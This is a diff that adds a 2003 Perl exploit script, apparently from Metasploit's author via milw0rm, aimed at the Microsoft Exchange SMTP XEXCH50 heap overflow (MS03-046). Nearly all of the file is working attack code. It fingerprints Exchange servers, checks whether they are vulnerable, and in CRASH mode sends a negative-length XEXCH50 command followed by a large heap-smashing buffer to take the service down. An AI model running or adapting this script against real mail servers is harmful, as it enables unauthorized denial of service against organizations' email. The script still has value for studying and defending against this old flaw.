@@ -1,0 +1,131 @@
+#!/usr/bin/perl -w
+##################
+
+##
+# ms03-046.pl - hdm metasploit com
+# This vulnerability allows a remote unauthenticated user to overwrite big chunks 
+# of the heap used by the inetinfo.exe process. Reliably exploiting this bug is 
+# non-trivial; even though the entire buffer is binary safe (even nulls) and can be 
+# just about any size, the actual code that crashes varies widely with each request. 
+# During the analysis process, numerous combinations of request size, concurrent 
+# requests, pre-allocations, and alternate trigger routes were examined and not a 
+# single duplicate of location and data offset was discovered. Hopefully the magic 
+# combination of data, size, and setup will be found to allow this bug to be reliably 
+# exploited.
+
+# minor bugfix: look for 354 Send binary data
+
+use strict;
+use IO::Socket;
+
+my $host = shift() || usage();
+my $mode = shift() || "CHECK";
+my $port = 25;
+
+
+if (uc($mode) eq "CHECK") { check() }
+if (uc($mode) eq "CRASH") { crash() }
+
+usage();
+
+
+sub check
+{
+    my $s = SMTP($host, $port);
+    if (! $s)
+    {
+        print "[*] Error establishing connection to SMTP service.\n";
+        exit(0);
+    }
+
+    print $s "XEXCH50 2 2\r\n";
+    my $res = <$s>;    
+    close ($s);
+
+    # a patched server only allows XEXCH50 after NTLM authentication
+    if ($res !~ /354 Send binary/i)
+    {
+        print "[*] This server has been patched or is not vulnerable.\n";
+        exit(0);
+    }
+
+    print "[*] This system is vulnerable: $host:$port\n";
+
+    exit(0);
+}
+
+
+sub crash
+{
+    my $s = SMTP($host, $port);
+    if (! $s)
+    {
+        print "[*] Error establishing connection to SMTP service.\n";
+        exit(0);
+    }
+
+    # the negative value allows us to overwrite random heap bits
+    print $s "XEXCH50 -1 2\r\n";
+    my $res = <$s>;    
+
+    # a patched server only allows XEXCH50 after NTLM authentication
+    if ($res !~ /354 Send binary/i)
+    {
+        print "[*] This server has been patched or is not vulnerable.\n";
+        exit(0);
+    }
+
+    print "[*] Sending massive heap-smashing string...\n";
+    print $s ("META" x 16384);
+
+    # sometimes a second connection is required to trigger the crash
+    $s = SMTP($host, $port);
+
+    exit(0);
+}
+
+
+sub usage 
+{
+    print STDERR "Usage: $0 <host> [CHECK|CRASH]\n";
+    exit(0);
+
+}
+
+sub SMTP
+{
+    my ($host, $port) = @_;
+    my $s = IO::Socket::INET->new
+    (
+        PeerAddr => $host,
+        PeerPort => $port,
+        Proto    => "tcp"
+    ) || return(undef);
+
+    my $r = <$s>;
+    return undef if !$r;
+    
+    if ($r !~ /Microsoft/)
+    {
+        chomp($r);
+        print STDERR "[*] This does not look like an exchange server: $r\n";
+        return(undef);
+    }
+    
+    print $s "HELO X\r\n";
+    $r = <$s>;
+    return undef if !$r;   
+
+    print $s "MAIL FROM: DoS\r\n";
+    $r = <$s>;
+    return undef if !$r;
+    
+    print $s "RCPT TO: Administrator\r\n";
+    $r = <$s>;
+    return undef if !$r;
+    
+    return($s); 
+}
+
+
+# milw0rm.com [2003-10-22]
